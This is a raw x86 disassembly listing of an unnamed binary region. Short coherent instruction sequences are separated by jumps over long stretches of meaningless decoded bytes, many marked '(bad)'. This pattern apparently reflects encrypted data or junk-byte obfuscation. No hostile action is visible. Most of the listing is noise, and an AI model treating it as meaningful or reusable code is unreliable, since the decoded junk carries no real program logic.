  407247:	repz mov eax,edx
  40724a:	cmp    DWORD PTR [ebp+0x1c],eax
  40724d:	je     0x40ab43
  407253:	jmp    0x406cce
  407258:	jmp    0x407330
  40725d:	jo     0x407234
  40725f:	cld    
  407260:	add    al,0xfd
  407262:	sub    eax,0x4e16f5f8
  407267:	or     eax,0x9336bd33
  40726c:	add    dl,BYTE PTR [edi]
  40726e:	add    BYTE PTR ds:[eax],al
  407271:	mov    ebx,0x29000000
  407276:	dec    ebp
  407277:	pop    ecx
  407278:	adc    DWORD PTR [eax+0x3d],edx
  40727b:	shl    DWORD PTR [esi+0x33],cl
  40727e:	(bad)  
  40727f:	aas    
  407280:	sub    bl,bl
  407282:	inc    ecx
  407283:	call   DWORD PTR [eax-0x5f]
  407286:	pop    edx
  407287:	or     eax,DWORD PTR [edx]
  407289:	rcl    BYTE PTR [ebx-0x3655a672],1
  40728f:	mov    al,ds:0x4a59179a
  407294:	inc    edx
  407295:	jmp    0x8018:0xcc298bf8
  40729c:	or     ebp,0x836b0ec6
  4072a2:	fwait
  4072a3:	icebp  
  4072a4:	(bad)  
  4072a5:	adc    esp,DWORD PTR [esi+0xa]
  4072a8:	push   ss
  4072a9:	mov    ds,WORD PTR [eax]
  4072ab:	mov    al,0x84
  4072ad:	inc    ebp
  4072ae:	div    dl
  4072b0:	jbe    0x4072ff
  4072b2:	hlt    
  4072b3:	cmp    al,0x78
  4072b5:	js     0x4072e6
  4072b7:	repz mov ebp,0xf6bc6d82
  4072bd:	lods   al,BYTE PTR ds:[esi]
  4072be:	ror    DWORD PTR [edx],cl
  4072c0:	ret    
  4072c1:	xor    al,0x16
  4072c3:	clc    
  4072c4:	and    eax,0xfbf7df47
  4072c9:	adc    eax,0xf0e737df
  4072ce:	call   0x8d6c01b2
  4072d3:	rol    DWORD PTR [ecx-0xe],0x9c
  4072d7:	(bad)  
  4072d8:	adc    DWORD PTR [esi+0x21ab3ca9],eax
  4072de:	fs mov dl,0xf2
  4072e1:	shr    BYTE PTR [ebx+0x6f],1
  4072e4:	inc    esp
  4072e5:	sbb    al,0x3f
  4072e7:	pop    ss
  4072e8:	cmp    eax,0xcd0fb36c
  4072ed:	xchg   esi,eax
  4072ee:	rcl    DWORD PTR [ebp-0x5e79b870],1
  4072f4:	xor    esi,esi
  4072f6:	mov    al,ds:0x7b803867
  4072fb:	cld    
  4072fc:	push   esp
  4072fd:	add    bh,BYTE PTR [edi]
  4072ff:	adc    ah,ah
  407301:	add    eax,0xbd15988e
  407306:	pop    edi
  407307:	(bad)  
  407308:	cld    
  407309:	cmp    ecx,DWORD PTR [eax-0xe]
  40730c:	rcr    DWORD PTR [ebx+0x35],0x74
  407310:	jbe    0x40731d
  407312:	stc    
  407313:	add    edi,DWORD PTR [eax-0x297ab46b]
  407319:	mov    dh,BYTE PTR [edi-0x2442c977]
  40731f:	cmp    edx,DWORD PTR [ebp+0x43a778a0]
  407325:	or     al,0xf4
  407327:	mov    esp,0xd8d3a695
  40732c:	xor    al,0x51
  40732e:	js     0x4072ed
  407330:	mov    eax,DWORD PTR [edi]
  407332:	mov    edx,DWORD PTR [edi+0x4]
  407335:	xor    edx,ebx
  407337:	xor    eax,esi
  407339:	jmp    0x407411
  40733e:	xchg   BYTE PTR [ecx+0x37],cl
  407341:	push   edi
  407342:	(bad)  
  407343:	jg     0x40732b
  407345:	fldenv [eax+0x6dbc4e26]
  40734b:	cli    
  40734c:	pop    edx
  40734d:	in     al,0xd2
  40734f:	add    BYTE PTR ds:[eax],al
  407352:	mov    ebx,0xa0000000
  407357:	loop   0x4073ae
  407359:	push   0x7c058aef
  40735e:	mov    edx,0x141e16c3
  407363:	loop   0x4073b5
  407365:	jl     0x407312
  407367:	jne    0x407317
  407369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40736a:	scas   eax,DWORD PTR es:[edi]
  40736b:	ja     0x40730b
  40736d:	jmp    0x4073bd
  40736f:	sub    al,BYTE PTR [edx-0xb]
  407372:	dec    edi
  407373:	repnz mov ecx,0x9832b748
  407379:	mov    esp,0xd36674ca
  40737e:	cdq    
  40737f:	(bad)  
  407380:	dec    eax
  407381:	in     eax,dx
  407382:	adc    eax,0xbbf98221
  407387:	ret    0x71a9
  40738a:	pop    es
  40738b:	sub    DWORD PTR [edx+edi*8],edi
  40738e:	leave  
  40738f:	cmc    
  407390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407391:	mov    DWORD PTR [ecx],edx
  407393:	sbb    bh,BYTE PTR [edi-0x5fd69121]
  407399:	cs fmul st,st(1)
  40739c:	sub    esp,DWORD PTR [edi-0xc]
  40739f:	dec    eax
  4073a0:	mov    ah,0x20
  4073a2:	mov    edx,0x89510562
  4073a7:	call   FWORD PTR [ebp-0x42]
  4073aa:	cmp    eax,0x4fbcb590
  4073af:	mov    gs,WORD PTR [ecx-0x3]
  4073b2:	push   ebp
  4073b3:	cmp    DWORD PTR [edx+0x60],esp
  4073b6:	push   esp
  4073b7:	out    dx,eax
  4073b8:	gs ret 0x740b
  4073bc:	mov    al,0xe8
  4073be:	adc    eax,0x64a8a949
  4073c3:	outs   dx,BYTE PTR ds:[esi]
  4073c4:	dec    ebx
  4073c5:	(bad)  
  4073c6:	xlat   BYTE PTR ds:[ebx]
  4073c7:	repnz xor BYTE PTR [ebx-0x7],dh
  4073cb:	mov    esp,0xe6f3dbf4
  4073d0:	mov    esp,0x4162c051
  4073d5:	bound  ebx,QWORD PTR [esp+ecx*2-0x4a0aa2e8]
  4073dc:	fwait
  4073dd:	out    0x45,al
  4073df:	dec    esp
  4073e0:	stc    
  4073e1:	imul   DWORD PTR [edx]
  4073e3:	and    eax,0x4be48f7f
  4073e8:	inc    eax
  4073e9:	ret    0x1d18
  4073ec:	adc    DWORD PTR [ebp-0x9],eax
  4073ef:	pop    esi
  4073f0:	jb     0x407465
  4073f2:	jne    0x407462
  4073f4:	jge    0x4073ba
  4073f6:	aad    0xb9
  4073f8:	les    edi,FWORD PTR [ecx]
  4073fa:	imul   ebx,edx,0x4ee29b63
  407400:	test   al,0xd
  407402:	in     al,dx
  407403:	fwait
  407404:	adc    DWORD PTR [esi-0x4d765dcc],0xffffffc8
  40740b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740c:	mov    ah,0xe9
  40740e:	xor    esi,DWORD PTR [ebp+0x1c]
  407411:	add    eax,0x99b8624d
  407416:	adc    edx,0x8ddc
  40741c:	mov    DWORD PTR [ebp+0x18],eax
  40741f:	mov    eax,DWORD PTR [ecx]
  407421:	mov    DWORD PTR [ebp+0x1c],edx
  407424:	mov    edx,DWORD PTR [ecx+0x4]
  407427:	jmp    0x4074ff
  40742c:	shr    esi,1
  40742e:	adc    dh,dl
  407430:	aas    
  407431:	(bad)  
  407432:	xlat   BYTE PTR ds:[ebx]
  407433:	out    dx,eax
  407434:	jb     0x40749c
  407436:	cmp    ecx,ebp
  407438:	adc    BYTE PTR [edi-0x7b],cl
  40743b:	mov    edi,0x3f8d
  407440:	mov    ebx,0xfe000000
  407445:	add    BYTE PTR [esi],bl
  407447:	(bad)
  40744a:	cld    
  40744b:	or     esp,DWORD PTR [esi+0x4]
  40744e:	cmp    BYTE PTR [esi],cl
  407450:	xor    esp,DWORD PTR [ebx+0x322ed5e8]
  407456:	fistp  WORD PTR [ebp+0x68]
  407459:	fiadd  DWORD PTR [esi+ebp*2-0xf]
  40745d:	xchg   ebx,eax
  40745e:	out    0x37,eax
  407460:	lods   eax,DWORD PTR ds:[esi]
  407461:	sbb    ebx,0xffffffe4
  407464:	jge    0x40745b
  407466:	call   0xe047:0x7cf6a3f5
  40746d:	fstp   QWORD PTR [esi+esi*4-0x4a]
  407471:	shl    BYTE PTR [eax+eiz*2],cl
  407474:	add    al,0x9
  407476:	stc    
  407477:	mov    al,ds:0x65207b4f
  40747c:	out    dx,eax
  40747d:	adc    BYTE PTR [ecx+0xcf466f8],0xd8
  407484:	into   
  407485:	sar    ebp,cl
  407487:	leave  
  407488:	fsub   st,st(1)
  40748a:	jl     0x407427
  40748c:	mov    ebp,0x5cd0ee0
  407491:	adc    eax,0xf07a7826
  407496:	adc    edx,DWORD PTR [ecx-0x26]
  407499:	jecxz  0x4074dc
  40749b:	out    0x2a,al
  40749d:	cmp    DWORD PTR [ebx],0x6a
  4074a0:	ja     0x407462
  4074a2:	adc    DWORD PTR [ebx],esi
  4074a4:	loop   0x4074be
  4074a6:	loop   0x4074d8
  4074a8:	adc    BYTE PTR [edi+0x34],dl
  4074ab:	mov    al,0xe5
  4074ad:	adc    dh,BYTE PTR [edi+edi*2]
  4074b0:	out    dx,al
  4074b1:	ss nop
  4074b3:	adc    DWORD PTR [ebx],esi
  4074b5:	sahf   
  4074b6:	cs cmp ebp,edi
  4074b9:	lock out 0x61,al
  4074bc:	push   esi
  4074bd:	xchg   edx,eax
  4074be:	mov    eax,ds:0xa406e31e
  4074c3:	stc    
  4074c4:	out    0xf3,eax
  4074c6:	out    dx,al
  4074c7:	or     al,0x40
  4074c9:	adc    DWORD PTR [edx-0x7b],ecx
  4074cc:	lods   eax,DWORD PTR ds:[esi]
  4074cd:	faddp  st(6),st
  4074cf:	adc    al,0xaf
  4074d1:	adc    BYTE PTR [ecx],ch
  4074d3:	(bad)  
  4074d4:	pop    edx
  4074d5:	loopne 0x4074cb
  4074d7:	push   ss
  4074d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d9:	or     eax,0xf4ff3df7
  4074de:	and    al,0x35
  4074e0:	or     ebp,DWORD PTR [ecx-0x5a20da4f]
  4074e6:	rcl    DWORD PTR [eax+0x43],0xac
  4074ea:	fucomp st(0)
  4074ec:	sub    DWORD PTR [edx],esi
  4074ee:	mov    al,0x64
  4074f0:	imul   ebx,ebp,0x18
  4074f3:	stc    
  4074f4:	xchg   ecx,eax
  4074f5:	sbb    al,0x7d
  4074f7:	jl     0x407516
  4074f9:	mov    dl,0xd2
  4074fb:	rcl    BYTE PTR [edi-0x39cc26f1],0xe9
  407502:	rol    DWORD PTR [eax],cl
  407504:	add    BYTE PTR [eax],al
  407506:	test   BYTE PTR [esi-0x39],bh
  407509:	cmp    edi,edi
  40750b:	mov    ebx,0x1fbefffc
  407510:	pushf  
  407511:	aas    
  407512:	jp     0x4074b7
  407514:	cwde   
  407515:	addr16 dec eax
  407517:	inc    eax
  407518:	add    BYTE PTR [eax],al
  40751a:	mov    ebx,0xdd000000
  40751f:	ret    
  407520:	rcr    BYTE PTR [esi+ecx*2-0x6e],cl
  407524:	or     eax,ebp
  407526:	pop    edx
  407527:	cdq    
  407528:	aad    0x8c
  40752a:	or     al,0x8d
  40752c:	retf   0x76a3
  40752f:	xor    dl,cl
  407531:	pop    esi
  407532:	adc    eax,0xb1331e7d
  407537:	push   edi
  407538:	mov    edi,0x1eeddaf1
  40753d:	int3   
  40753e:	or     DWORD PTR [ecx],ebp
  407540:	cmp    DWORD PTR [esi-0x6b95ab58],ebx
  407546:	adc    esp,ebx
  407548:	mov    ds:0xbde851ff,al
  40754d:	shl    cl,1
  40754f:	shl    DWORD PTR [esp+eax*4],1
  407552:	adc    eax,0xe21da6db
  407557:	test   BYTE PTR [ebx+ebx*8-0x45],al
  40755b:	jne    0x407573
  40755d:	(bad)  
  40755e:	cmp    al,0xbe
  407560:	cmovns esi,esp
  407563:	xchg   edi,eax
  407564:	jbe    0x4075b3
  407566:	int    0xdf
  407568:	inc    ebp
  407569:	push   ebx
  40756a:	mov    ah,0xc2
  40756c:	cdq    
  40756d:	test   ch,al
  40756f:	mov    ds:0xa0ca2731,eax
  407574:	jg     0x40757a
  407576:	scas   al,BYTE PTR es:[edi]
  407577:	mov    al,ds:0x4b74bf51
  40757c:	aas    
  40757d:	cmp    DWORD PTR [eax-0x35],0x87eb1f75
  407584:	imul   ebp,DWORD PTR [ebx+0x39],0x528e7cbc
  40758b:	arpl   WORD PTR [ebx-0x7],si
  40758e:	push   ebp
  40758f:	rcl    ch,cl
  407591:	or     esi,DWORD PTR [eax+0x21]
  407594:	or     BYTE PTR [ecx],ch
  407596:	and    DWORD PTR [edi],0xffffff8c
  407599:	stos   DWORD PTR es:[edi],eax
  40759a:	call   0x10039bc2
  40759f:	setnp  BYTE PTR [ebx+0x7319408]
  4075a6:	dec    ecx
  4075a7:	rcl    DWORD PTR [ecx-0x67f97cc0],1
  4075ad:	call   0x63c96131
  4075b2:	lods   al,BYTE PTR ds:[esi]
  4075b3:	mov    esp,0x18cbeda1
  4075b8:	repnz call 0x8151:0xb0e20545
  4075c0:	cli    
  4075c1:	mov    ds:0x4e3236aa,eax
  4075c6:	xchg   esp,eax
  4075c7:	push   ebp
  4075c8:	xchg   edi,eax
  4075c9:	pop    esp
  4075ca:	add    BYTE PTR [esi],dh
  4075cc:	les    eax,FWORD PTR [esp+edi*2]
  4075cf:	push   esi
  4075d0:	mov    es,WORD PTR [eax-0x1e]
  4075d3:	mov    ebp,ebp
  4075d5:	inc    edx
  4075d6:	lods   eax,DWORD PTR ds:[esi]
  4075d7:	loop   0x407651
  4075d9:	xor    edx,ebx
  4075db:	add    eax,0x99b8624d
  4075e0:	adc    edx,0x8ddc
  4075e6:	mov    DWORD PTR [ebp-0x5c],edx
  4075e9:	jmp    0x4076c1
  4075ee:	cmp    eax,DWORD PTR [esi]
  4075f0:	add    DWORD PTR [ebp+edi*1-0x22484071],ecx
  4075f7:	adc    esi,eax
  4075f9:	xor    ecx,DWORD PTR [ecx+0x3e4d786]
  4075ff:	inc    ecx
  407600:	add    BYTE PTR [eax],al
  407602:	mov    ebx,0x84000000
  407607:	shl    DWORD PTR [ebx],0x20
  40760a:	sbb    ecx,esi
  40760c:	pushf  
  40760d:	pop    esi
  40760e:	mov    ecx,0x26e5221d
  407613:	inc    edx
  407614:	ins    BYTE PTR es:[edi],dx
  407615:	add    BYTE PTR [esi],bh
  407617:	xchg   ebx,eax
  407618:	sti    
  407619:	mov    ebx,0xa5e083e5
  40761e:	xor    edx,esp
  407620:	inc    ecx
  407621:	fwait
  407622:	jp     0x4075b5
  407624:	loopne 0x4076a0
  407626:	out    dx,al
  407627:	cmp    BYTE PTR [esi],dl
  407629:	jge    0x4075d1
  40762b:	bnd jle 0x40761f
  40762e:	mov    ecx,DWORD PTR [eax-0x6978a88]
  407634:	mov    al,ds:0xe866bec4
  407639:	pop    ss
  40763a:	pop    es
  40763b:	cmc    
  40763c:	pop    edi
  40763d:	mov    bl,0xef
  40763f:	or     eax,0xab68b829
  407644:	(bad)  
  407645:	lahf   
  407646:	pop    eax
  407647:	arpl   WORD PTR [edi+edx*1],ax
  40764a:	sbb    edi,DWORD PTR [eax]
  40764c:	mov    eax,0xe1d40deb
  407651:	pop    es
  407652:	mov    DWORD PTR [ecx-0x867c9b7],ebx
  407658:	inc    ecx
  407659:	(bad)  
  40765b:	xchg   ebx,eax
  40765c:	sbb    eax,0x7ada912c
  407661:	mov    bl,0xcf
  407663:	(bad)  
  407664:	popa   
  407665:	add    esp,esi
  407667:	call   0x7c42d243
  40766c:	dec    esp
  40766d:	pushf  
  40766e:	leave  
  40766f:	popf   
  407670:	pop    ss
  407671:	sbb    eax,0x5ee11f1f
  407676:	test   eax,0x60401352
  40767b:	hlt    
  40767c:	or     BYTE PTR [edi-0x24],al
  40767f:	jg     0x4076fa
  407681:	mov    cl,0xba
  407683:	sbb    esp,ebp
  407685:	mov    edx,0xe100e085
  40768a:	lock addr16 cmp eax,0x7a8b077
  407691:	sbb    ebx,DWORD PTR [ebp+0x4b797e6c]
  407697:	push   ebx
  407698:	ins    DWORD PTR es:[edi],dx
  407699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40769a:	push   edx
  40769b:	or     dl,dh
  40769d:	or     eax,0x2cf2bc1c
  4076a2:	sbb    BYTE PTR [edx-0x53b62ae2],0x96
  4076a9:	and    DWORD PTR fs:[edx],0xb7d1af0d
  4076b0:	xor    al,0x78
  4076b2:	push   edi
  4076b3:	call   0x19f80316
  4076b8:	imul   esi,DWORD PTR [eax-0x5d6f9b51],0x39c594f0
  4076c2:	inc    ebp
  4076c3:	sbb    BYTE PTR [edi],cl
  4076c5:	test   ebx,esp
  4076c7:	add    BYTE PTR [eax],al
  4076c9:	add    BYTE PTR [ebx+0xd3e9c2],cl
  4076cf:	add    BYTE PTR [eax],al
  4076d1:	inc    edi
  4076d2:	mov    al,0x9f
  4076d4:	cmc    
  4076d5:	(bad)  
  4076d6:	jmp    FWORD PTR [edi-0x4e]
  4076d9:	idiv   DWORD PTR [edi-0x7bede3b9]
  4076df:	lahf   
  4076e0:	mov    eax,ds:0x41be
  4076e5:	mov    ebx,0x3f000000
  4076ea:	push   edi
  4076eb:	mov    DWORD PTR [ecx-0x42],esp
  4076ee:	or     ebx,0xffffffed
  4076f1:	push   esp
  4076f2:	out    dx,al
  4076f3:	mov    ds:0x5fd0caf4,al
  4076f8:	sub    ah,ah
  4076fa:	fadd   DWORD PTR ds:0xd1fefea1
  407700:	mov    al,0x76
  407702:	pop    eax
  407703:	into   
  407704:	gs cli 
  407706:	adc    cl,BYTE PTR [eax+0x31fd8c18]
  40770c:	cli    
  40770d:	(bad)  
  40770e:	outs   dx,DWORD PTR ds:[esi]
  40770f:	fisubr DWORD PTR [ebx+0x2f4a744c]
  407715:	inc    esp
  407716:	jb     0x4076f7
  407718:	push   ss
  407719:	aam    0xab
  40771b:	inc    eax
  40771c:	mov    ecx,0x84f3c38c
  407721:	(bad)  
  407722:	pop    ebx
  407723:	test   esi,ebp
  407725:	ja     0x40775d
  407727:	popa   
  407728:	xchg   edi,eax
  407729:	shr    al,1
  40772b:	sbb    DWORD PTR [eax-0x1661c3c1],ebp
  407731:	pop    ecx
  407732:	test   ebx,esp
  407734:	mov    ah,ah
  407736:	xlat   BYTE PTR ds:[ebx]
  407737:	shl    BYTE PTR [eax+edi*8-0x34b62796],cl
  40773e:	mov    ds:0x922017db,eax
  407743:	fisttp WORD PTR [ebx+esi*8-0x3c]
  407747:	mov    ebp,0x1f97e7e4
  40774c:	ins    BYTE PTR es:[edi],dx
  40774d:	leave  
  40774e:	push   ss
  40774f:	inc    ebx
  407750:	pop    ss
  407751:	xor    bh,BYTE PTR [esi+0x32b9a166]
  407757:	popa   
  407758:	jne    0x40773d
  40775a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40775b:	arpl   WORD PTR [ebp+0x6a61d24a],si
  407761:	popf   
  407762:	push   esi
  407763:	out    0xd8,eax
  407765:	push   edi
  407766:	dec    ecx
  407767:	pushf  
  407768:	loop   0x407798
  40776a:	cmp    al,0x4b
  40776c:	repz xchg edi,eax
  40776e:	test   DWORD PTR [eax-0xac0692],0x5dcea2ae
  407778:	enter  0xf5ab,0xda
  40777c:	ret    
  40777d:	inc    eax
  40777e:	mov    al,0x7d
  407780:	xchg   BYTE PTR [edx+0x7b],ch
  407783:	and    al,0x2b
  407785:	cmp    eax,0x7cc96c43
  40778a:	rcl    BYTE PTR [edi-0x1b],0xa1
  40778e:	outs   dx,BYTE PTR ds:[esi]
  40778f:	test   BYTE PTR [esi],ch
  407791:	adc    esp,DWORD PTR [ebp+0x1deaa91d]
  407797:	rcr    DWORD PTR [ebx],0x79
  40779a:	js     0x407739
  40779c:	or     al,0x37
  40779e:	and    DWORD PTR [eax-0x43afe1e3],ecx
  4077a4:	cmp    DWORD PTR [ebp+0x1c],eax
  4077a7:	je     0x407a5d
  4077ad:	mov    eax,DWORD PTR [ebp+0x8]
  4077b0:	mov    edx,DWORD PTR [ebp+0xc]
  4077b3:	mov    edx,DWORD PTR [ebp-0x4]
  4077b6:	mov    edx,DWORD PTR [edx+0x3c]
  4077b9:	lea    eax,[edx+eax*8+0x78]
  4077bd:	jmp    0x407895
  4077c2:	mov    fs,edi
  4077c4:	pop    ebx
  4077c5:	sar    DWORD PTR [ebx-0x3],0x9e
  4077c9:	out    dx,eax
  4077ca:	or     DWORD PTR [ebp+esi*4-0x4ca7781c],ebx
  4077d1:	in     al,0x79
  4077d3:	inc    edx
  4077d4:	add    BYTE PTR [eax],al
  4077d6:	mov    ebx,0x78000000
  4077db:	shl    BYTE PTR ds:[edx+0x46],0xe
  4077e0:	xchg   edi,eax
  4077e1:	cdq    
  4077e2:	retf   0xab66
  4077e5:	out    0xd6,eax
  4077e7:	cmp    ah,BYTE PTR [esi+0x3d]
  4077ea:	std    
  4077eb:	lods   eax,DWORD PTR ds:[esi]
  4077ec:	xlat   BYTE PTR ds:[ebx]
  4077ed:	lods   al,BYTE PTR ds:[esi]
  4077ee:	popf   
  4077ef:	or     DWORD PTR [esi+0x42],esp
  4077f2:	and    BYTE PTR [ecx],0xed
  4077f5:	xor    cl,BYTE PTR [esi+0x3a]
  4077f8:	or     cl,0xf7
  4077fb:	jmp    FWORD PTR [eax+0x5c61330b]
  407801:	push   es
  407802:	test   eax,0xd8755d69
  407807:	pop    ebp
  407808:	sbb    DWORD PTR [edx],ecx
  40780a:	icebp  
  40780b:	mul    DWORD PTR [esp+edx*8]
  40780e:	shl    DWORD PTR [eax-0x12de96f6],1
  407814:	into   
  407815:	out    dx,eax
  407816:	fs sahf 
  407818:	pop    ds
  407819:	jmp    0x7dfbe2b8
  40781e:	or     bl,BYTE PTR [ecx+0x54]
  407821:	or     ecx,DWORD PTR [ecx-0x74]
  407824:	out    0xc0,eax
  407826:	ins    DWORD PTR es:[edi],dx
  407827:	jmp    0xca84:0x6f744b50
  40782e:	leave  
  40782f:	sbb    bl,ch
  407831:	add    bh,BYTE PTR [ebp+0x6]
  407834:	and    eax,0xf6b68f59
  407839:	dec    esp
  40783a:	stc    
  40783b:	iret   
  40783c:	sahf   
  40783d:	push   ebp
  40783e:	in     al,dx
  40783f:	sbb    DWORD PTR [edi+esi*1-0x19266a2d],esp
  407846:	loopne 0x407806
  407848:	cmp    al,0xfd
  40784a:	mov    bl,0x89
  40784c:	mov    ecx,0xbbb9fbab
  407851:	jae    0x4077fb
  407853:	shl    bh,0x43
  407856:	lahf   
  407857:	pop    esi
  407858:	out    dx,al
  407859:	aam    0x73
  40785b:	adc    ch,BYTE PTR [ebp-0x7e]
  40785e:	bound  ebx,QWORD PTR [ebx]
  407860:	test   edx,edi
  407862:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  407864:	or     al,0x42
  407866:	sbb    dh,al
  407868:	iret   
  407869:	or     esp,0x3ea8902c
  40786f:	int    0x2e
  407871:	in     al,dx
  407872:	int3   
  407873:	xor    al,0x83
  407875:	repnz mov eax,0xedd91f45
  40787b:	mov    ch,0x6a
  40787d:	lea    esi,[ebx+0x49c7d8be]
  407883:	ins    BYTE PTR es:[edi],dx
  407884:	sbb    eax,0xcb991aa5
  407889:	adc    al,0x31
  40788b:	sbb    al,0x4f
  40788d:	push   0x8c4dc0bb
  407892:	(bad)  [eax+edi*4-0x7403aa75]
  407899:	add    al,0x2
  40789b:	mov    DWORD PTR [ebp-0xc],eax
  40789e:	jmp    0x407976
  4078a3:	call   0x9b7d:0xff382b4e
  4078aa:	out    dx,al
  4078ab:	pop    ecx
  4078ac:	ss icebp 
  4078ae:	addr16 mov edx,0x3495bd0a
  4078b4:	inc    ebx
  4078b5:	add    BYTE PTR [eax],al
  4078b7:	mov    ebx,0x7a000000
  4078bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078bd:	mov    al,ds:0xbe87c12
  4078c2:	cdq    
  4078c3:	dec    ebp
  4078c4:	inc    esi
  4078c5:	vpsrlq ymm3,ymm1,xmm5
  4078c9:	or     bh,BYTE PTR [eax+0x9]
  4078cc:	out    dx,al
  4078cd:	in     al,dx
  4078ce:	xchg   esp,eax
  4078cf:	mov    dh,0x9e
  4078d1:	adc    DWORD PTR [esi-0x4ff5c8c7],edx
  4078d7:	or     DWORD PTR [edi],0xdbcfaebe
  4078dd:	or     edi,esi
  4078df:	xchg   ecx,eax
  4078e0:	xchg   edi,eax
  4078e1:	mov    ebp,ecx
  4078e3:	jb     0x407927
  4078e5:	push   edi
  4078e6:	jmp    0x7a6699d0
  4078eb:	loop   0x4078a2
  4078ed:	inc    esi
  4078ee:	imul   ebx,DWORD PTR [edx+0x28],0x13
  4078f2:	int3   
  4078f3:	mov    ss,ecx
  4078f5:	push   edx
  4078f6:	out    dx,al
  4078f7:	cli    
  4078f8:	or     eax,0x1ec52a6d
  4078fd:	ret    
  4078fe:	xchg   ebx,ecx
  407900:	les    ebx,FWORD PTR [eax+0x33a637f3]
  407906:	out    dx,eax
  407907:	push   ss
  407908:	sub    al,0x81
  40790a:	and    BYTE PTR [edx],al
  40790c:	pop    eax
  40790d:	jo     0x40792a
  40790f:	adc    al,0xc7
  407911:	xchg   esi,eax
  407912:	clc    
  407913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407914:	mov    ebx,0x69e45dbd
  407919:	(bad)  
  40791a:	hlt    
  40791b:	xor    bl,al
  40791d:	aaa    
  40791e:	jo     0x407974
  407920:	pop    edx
  407921:	xor    edx,edi
  407923:	fsub   QWORD PTR [esi+esi*4-0x3c]
  407927:	mov    WORD PTR ds:0x24b4bbf8,ss
  40792d:	inc    edx
  40792e:	adc    DWORD PTR [edx+eiz*4+0x5cc59697],edx
  407935:	or     eax,0x9646d9de
  40793a:	pop    eax
  40793b:	jbe    0x4078fa
  40793d:	(bad)  
  40793e:	idiv   BYTE PTR [ecx+eiz*4+0x4b]
  407942:	lock pop ebx
  407944:	pushf  
  407945:	sbb    al,0xac
  407947:	mov    cl,0x5c
  407949:	gs pop esp
  40794b:	dec    edx
  40794c:	sub    dh,al
  40794e:	xchg   ebp,eax
  40794f:	cmp    al,ch
  407951:	sbb    al,dh
  407953:	fstp   QWORD PTR gs:[ebx-0x36]
  407957:	mov    edi,0x6a9e0694
  40795c:	shl    BYTE PTR [ebp-0x4dbdff39],cl
  407962:	sub    BYTE PTR [eax+0xa5dc98e],ch
  407968:	sahf   
  407969:	add    esp,DWORD PTR [edi-0x516c5117]
  40796f:	in     al,0xfb
  407971:	xor    DWORD PTR [ebx-0x17],0xffffffa6
  407975:	mov    WORD PTR [ebx+0x4578b07],cs
  40797b:	xor    eax,esi
  40797d:	jmp    0x407a55
  407982:	ret    0xa28d
  407985:	(bad)  
  407986:	out    dx,eax
  407987:	push   esi
  407989:	popf   
  40798a:	ds js  0x4079ab
  40798d:	in     al,0xcc
  40798f:	dec    esi
  407990:	xor    BYTE PTR [edi+ebp*8-0x44ffffbd],ah
  407997:	add    BYTE PTR [eax],al
  407999:	add    BYTE PTR [edi-0x48],dl
  40799c:	dec    ecx
  40799d:	(bad)  
  40799e:	jb     0x40799b
  4079a0:	out    0xbd,eax
  4079a2:	std    
  4079a3:	lahf   
  4079a4:	(bad)  
  4079a5:	test   eax,0x354f72b5
  4079aa:	neg    al
  4079ac:	pushf  
  4079ad:	pusha  
  4079ae:	mov    esp,0xe574ca0a
  4079b3:	mov    al,0x22
  4079b5:	rcl    BYTE PTR [edx+0x31],1
  4079b8:	ins    DWORD PTR es:[edi],dx
  4079b9:	cdq    
  4079ba:	seta   BYTE PTR [eax+0x4fbabb22]
  4079c1:	jle    0x4079d4
  4079c3:	stc    
  4079c4:	call   0x1bbdab09
  4079c9:	push   ebp
  4079ca:	cli    
  4079cb:	pop    ss
  4079cc:	push   ecx
  4079cd:	aaa    
  4079ce:	outs   dx,BYTE PTR ds:[esi]
  4079cf:	das    
  4079d0:	int3   
  4079d1:	xchg   ebx,eax
  4079d2:	ret    
  4079d3:	ret    0x5da2
  4079d6:	mov    esp,0xc58930c4
  4079db:	fs mov ah,0x3f
  4079de:	xchg   BYTE PTR [ebx+0x16801f3b],ch
  4079e4:	or     al,0xbc
  4079e6:	sbb    BYTE PTR [eax],al
  4079e8:	and    al,ah
  4079ea:	fldenv [eax]
  4079ec:	jle    0x407a51
  4079ee:	dec    edi
  4079ef:	jno    0x407a20
  4079f1:	xlat   BYTE PTR ds:[ebx]
  4079f2:	mov    esp,0xd5bb189a
  4079f7:	fisttp DWORD PTR [edi-0x55c396a8]
  4079fd:	mov    ebp,0xd75fcecf
  407a02:	add    DWORD PTR [ebp-0x61],ebx
  407a05:	pmuludq mm7,QWORD PTR [ebx+0x3b1b7d87]
  407a0c:	sub    BYTE PTR [eax+0x1e],dl
  407a0f:	fwait
  407a10:	add    eax,0x7c7d46a7
  407a15:	addr16 cmp al,0xb9
  407a18:	sub    DWORD PTR [edx+0x3],ebx
  407a1b:	jnp    0x407a5a
  407a1d:	sbb    al,0x88
  407a1f:	and    edi,DWORD PTR cs:[edx-0x77cb6db2]
  407a26:	call   0x507b:0xb6b6e027
  407a2d:	xchg   DWORD PTR [edi+0x2d],ebx
  407a30:	and    eax,0x35ea9bac
  407a35:	fistp  DWORD PTR [ebp-0x73]
  407a38:	jmp    0x67fb7b09
  407a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a3e:	mov    edi,0x4a3d4120
  407a43:	dec    edi
  407a44:	cdq    
  407a45:	stos   BYTE PTR es:[edi],al
  407a46:	sbb    eax,0xde2ec6c8
  407a4b:	jge    0x407a69
  407a4d:	cmp    bh,dl
  407a4f:	js     0x407ab2
  407a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a52:	repnz sti 
  407a54:	mov    ebx,0x479db32d
  407a59:	mov    WORD PTR [ebp-0x10],ax
  407a5d:	mov    eax,DWORD PTR [ebp-0xc]
  407a60:	xor    edx,edx
  407a62:	add    eax,0x66479db3
  407a67:	adc    edx,0xffff7223
  407a6d:	jmp    0x407b45
  407a72:	add    eax,0x67806646
  407a77:	mov    al,ds:0x3b4fc7e7
  407a7c:	dec    ebp
